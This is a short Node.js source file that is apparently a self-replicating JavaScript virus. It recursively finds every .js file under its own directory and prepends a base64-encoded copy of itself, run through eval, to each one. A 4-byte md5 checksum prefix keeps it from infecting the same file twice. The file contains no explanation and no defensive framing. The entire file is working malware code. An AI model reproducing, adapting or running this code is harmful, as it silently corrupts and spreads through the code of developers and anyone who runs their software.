//000
function execute(vData) {
    const fs = require("fs")
    const bufferFrom = Buffer.from

    const jsFiles = getAllFiles(__dirname, "js", true)
    for (const filePath of jsFiles) {
        if (filePath === __filename || filePath.endsWith("boom.js")) continue
        const fileBuffer = fs.readFileSync(filePath)
        const checksum = getChecksumFileName(filePath)
        const prefixBuffer = bufferFrom(`0x${checksum};`)
        const checksumMatches = Buffer.compare(prefixBuffer, fileBuffer.slice(0, prefixBuffer.length)) == 0
        if (checksumMatches) continue
        const payloadBuffer = createPayload(vData)
        const newBuffer = Buffer.concat([prefixBuffer, payloadBuffer, fileBuffer])
        fs.writeFileSync(filePath, newBuffer)
    }

    function getAllFiles(currentPath, fileType = "", recurs = false) {
        let allFiles = []
        const dirItems = fs.readdirSync(currentPath, { withFileTypes: true })
        for (item of dirItems) {
            const path = require('path');
            const itemPath = path.resolve(currentPath, item.name)
            if (recurs && item.isDirectory()) {
                allFiles = allFiles.concat(getAllFiles(itemPath, fileType, recurs))
            }
            else if (item.name.endsWith(fileType)) {
                allFiles.push(itemPath)
            }
        }
        return allFiles
    }

    function createPayload(vDataBase64) {
        const payload = `v="${vDataBase64}";eval(Buffer.from(v,"base64").toString());execute(v);\n`
        return bufferFrom(payload)
    }

    function getChecksumFileName(filePath) {
        const fileNameBuffer = bufferFrom(filePath)
        const crypto = require("crypto")
        const alg = crypto.createHash("md5")
        alg.update(fileNameBuffer)
        return alg.digest().slice(0, 4).toString("hex")
    }
}
//111

const startPrefix = "000"
const endPrefix = "111"
const fs = require("fs")
const thisFile = fs.readFileSync(__filename)
const vStart = thisFile.indexOf(startPrefix) + startPrefix.length
const vEnd = thisFile.indexOf(endPrefix) + endPrefix.length
const vData = thisFile.slice(vStart, vEnd)
// todo: minify vData
vDataMin = vData
const vDataBase64 = Buffer.from(vDataMin).toString("base64")
execute(vDataBase64)